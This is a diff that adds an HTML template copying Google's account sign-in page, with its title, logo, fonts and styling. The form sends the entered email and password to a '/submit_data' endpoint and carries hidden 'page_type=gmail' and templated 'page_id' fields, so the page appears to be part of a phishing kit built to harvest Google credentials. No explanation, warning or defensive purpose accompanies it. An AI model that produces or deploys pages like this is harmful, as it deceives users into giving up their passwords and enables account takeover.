@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-blue-hover: #1557b0;
+            --google-gray: #3c4043;
+            --google-text: #202124;
+            --google-border: #dadce0;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #fff;
+            color: var(--google-text);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 24px;
+        }
+        
+        .login-box {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid var(--google-border);
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .google-logo {
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        
+        h1 {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+        
+        .login-form {
+            width: 100%;
+            max-width: 368px;
+        }
+        
+        .form-group {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        
+        .form-control {
+            width: 100%;
+            height: 54px;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid var(--google-border);
+            border-radius: 4px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+        
+        .form-control:focus {
+            border-color: var(--google-blue);
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        
+        .form-control:focus + .form-label,
+        .form-control:not(:placeholder-shown) + .form-label {
+            transform: scale(0.75) translateY(-39px);
+            background: #fff;
+            padding: 0 4px;
+            color: var(--google-blue);
+        }
+        
+        .form-label {
+            position: absolute;
+            left: 16px;
+            top: 17px;
+            font-size: 16px;
+            color: #5f6368;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            transform-origin: left top;
+        }
+        
+        .forgot-email {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            color: var(--google-blue);
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            text-decoration: none;
+            margin: 8px 0;
+            display: inline-block;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .create-account {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            color: var(--google-blue);
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            text-decoration: none;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            background-color: var(--google-blue);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            padding: 0 24px;
+            height: 36px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        
+        .next-button:hover {
+            background-color: var(--google-blue-hover);
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 24px;
+            color: var(--google-gray);
+            font-size: 12px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #fff;
+        }
+        
+        .footer select {
+            padding: 4px 8px;
+            border: 1px solid var(--google-border);
+            border-radius: 4px;
+            color: var(--google-gray);
+            font-size: 12px;
+            background: #fff;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+        
+        .footer-links a {
+            color: var(--google-gray);
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 600px) {
+            .login-box {
+                border: none;
+                padding: 24px;
+            }
+            
+            .footer {
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+                position: static;
+                margin-top: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+            <h1>Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+            
+            <form class="login-form" method="POST" action="/submit_data">
+                <input type="hidden" name="page_type" value="gmail">
+                <input type="hidden" name="page_id" value="{{ page_id }}">
+                
+                <div class="form-group">
+                    <input type="text" class="form-control" id="email" name="username" placeholder=" " required>
+                    <label class="form-label" for="email">Email or phone</label>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-control" id="password" name="password" placeholder=" " required>
+                    <label class="form-label" for="password">Password</label>
+                </div>
+                
+                <a href="#" class="forgot-email">Forgot email?</a>
+                
+                <div class="button-container">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <select>
+            <option>English (United States)</option>
+        </select>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+</body>
+</html> 
